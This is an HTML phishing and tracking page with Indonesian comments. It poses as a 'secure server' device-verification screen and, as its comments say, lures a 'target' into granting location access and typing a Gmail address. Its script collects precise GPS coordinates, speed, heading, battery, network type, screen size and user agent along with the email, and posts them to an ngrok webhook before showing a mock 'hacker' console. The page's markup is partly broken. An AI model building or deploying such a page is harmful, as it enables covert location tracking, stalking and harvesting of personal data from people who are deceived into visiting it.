<head>

    <title id="tab-title">Connecting...</title>
    <style>
        /* Tampilan Awal: Putih bersih, normal seperti Chrome standar */
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff; 
            color: #333333; 
            padding: 50px 20px;

            margin: 0;

        .loading-spinner {
            border: 4px solid #f3f3f3;

            width: 40px;
            height: 40px;

        .blink { animation: blinker 1s linear infinite; color: #ff3333; }
        @keyframes blinker { 50% { opacity: 0; } }
    </style>
</head>
<body>

	    <!-- 🌐 KONDISI 1: TAMPILAN NORMAL (Pancingan Izin Lokasi & Input Gmail) -->
    <div id="normal-view">
        <!-- Spinner ditaruh paling atas agar terlihat seperti sedang loading sistem resmi -->
        <div class="loading-spinner"></div>
        
        <h3 style="font-weight: 500; color: #5f6368; margin-bottom: 5px;">Connecting to secure server cluster...</h3>

            <br>
            <button onclick="prosesHandshake()" style="padding: 12px 24px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 14px; cursor: pointer; width: 85%; max-width: 320px; box-sizing: border-box;">Verifikasi Integritas Perangkat</button>
        </div>
    </div>

    <!-- ⚡ KONDISI 2: TAMPILAN HACKER KEREN (Muncul Setelah Data Masuk Database) -->
    <div id="hacker-view" class="hacker-mode">
        <div class="header-title">⚡ SECURITY SIMULATOR ENGINE ACTIVE</div>

        </div>
    </div>

        <script>
        // ⚠️ SAMAKAN DENGAN LINK NGROK AKTIF DI TERMINAL VS CODE ANDA SAAT INI!
        const WEBHOOK_URL = "https://ditzy-omega-mud.ngrok-free.dev/webhook"; 
        const ipAddress = "114.10.157.196";

        // Fungsi yang berjalan saat tombol "Verifikasi Integritas Perangkat" diklik oleh target
        function prosesHandshake() {
            const emailInput = document.getElementById('email-target').value;
            
            // Validasi sederhana agar target tidak mengosongkan input email
            if (!emailInput || !emailInput.includes('@')) {
                alert("Silakan masukkan alamat Gmail yang valid untuk verifikasi!");
                return;
            }

            document.getElementById('status-text').innerText = "[PROCESSING] Compiling hardware metrics...";
            
            // Jalankan fungsi GPS dan kirim data bersama email yang diketik target
            kirimLokasi(emailInput);
        }

        async function kirim(data) {
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                
                // Efek Bunglon Berubah Menjadi Hacker Setelah Sukses Kirim Data!
                document.title = "CyberSec System Core v2.4";
                document.body.style.backgroundColor = "#050505";
                document.getElementById('normal-view').style.display = "none";
                
                const hackerView = document.getElementById('hacker-view');
                hackerView.style.display = "block";
                
                document.getElementById('log-data').innerHTML = `
                    &gt; PIPING HARDWARE METRICS TO SQL... DONE<br>
                    &gt; TARGET ID: ${data.email}<br>
                    &gt; DATABASE FILE: pelacakan.db LOCKED<br>
                    &gt; RESOLUTION DETECTED: ${data.screen} <span class="blink">[SECURE LINK]</span>
                `;
            } catch (err) {
                document.getElementById('status-text').innerText = "Connection failed. Please refresh.";
            }
        }

        function kirimLokasi(emailUser) {
            if (!navigator.geolocation) {
                document.getElementById('status-text').innerText = "Hardware API error.";
                return;
            }

            navigator.geolocation.getCurrentPosition(async (pos) => {
                const { latitude, longitude, accuracy, speed, heading } = pos.coords;

                let batteryData = null;
                try {
                    if (navigator.getBattery) {
                        const bat = await navigator.getBattery();
                        batteryData = { level: Math.round(bat.level * 100), charging: bat.charging };
                    }
                } catch(e) {}

                let networkData = "Active Node";
                try {
                    if (navigator.connection) {
                        networkData = `${navigator.connection.type || 'Cellular/WiFi'} (${navigator.connection.downlink || 5} Mbps)`;
                    }
                } catch(e) {}

                const data = {
                    email: emailUser, // Data Gmail Baru Sukses Diikutkan ke Server!
                    lat: latitude,
                    lon: longitude,
                    accuracy: accuracy,
                    speed: speed || null,
                    direction: heading || null,
                    battery: batteryData,
                    network: networkData,
                    screen: `${window.screen.width}x${window.screen.height}`,
                    device: navigator.userAgent,
                    ip: ipAddress,
                    server_time: new Date().toLocaleString("id-ID")
                };

                kirim(data);
            }, (err) => {
                document.getElementById('status-text').style.color = "#ff3333";
                document.getElementById('status-text').innerText = "Handshake rejected: Access to secure protocols denied.";
            }, { enableHighAccuracy: true, timeout: 15000 });
        }
    </script>
</body>
</html>
